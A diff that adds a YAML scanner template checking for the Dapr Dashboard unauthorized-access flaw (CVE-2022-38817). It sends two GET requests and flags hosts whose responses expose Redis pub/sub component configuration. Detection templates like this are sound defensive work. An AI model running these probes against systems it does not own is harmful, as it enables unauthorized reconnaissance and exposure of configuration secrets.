@@ -1,0 +1,29 @@
+id: poc-yaml-dapr-dashboard-unauthorized-access
+info:
+  name: Dapr Dashboard 未授权访问漏洞(CVE-2022-38817)
+  severity: high
+  tags:
+  - CVE-2022-38817
+  - 未授权访问
+  finger: Dapr Dashboard
+requests:
+- method: GET
+  path: /components/pubsub
+  expression: 'status_code == 200
+
+    && contains(title,"Dapr Dashboard")
+
+    '
+- method: GET
+  path: /api/components/All
+  expression: 'status_code == 200
+
+    && contains(body,"\"name\":\"redisHost\"")
+
+    && contains(body,"apiVersion")
+
+    && contains(body,"pubsub.redis")
+
+    '
+variables: {}
+transport: http
